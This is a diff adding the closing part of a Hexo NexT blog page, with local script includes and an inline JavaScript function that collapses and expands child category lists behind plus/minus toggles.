+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
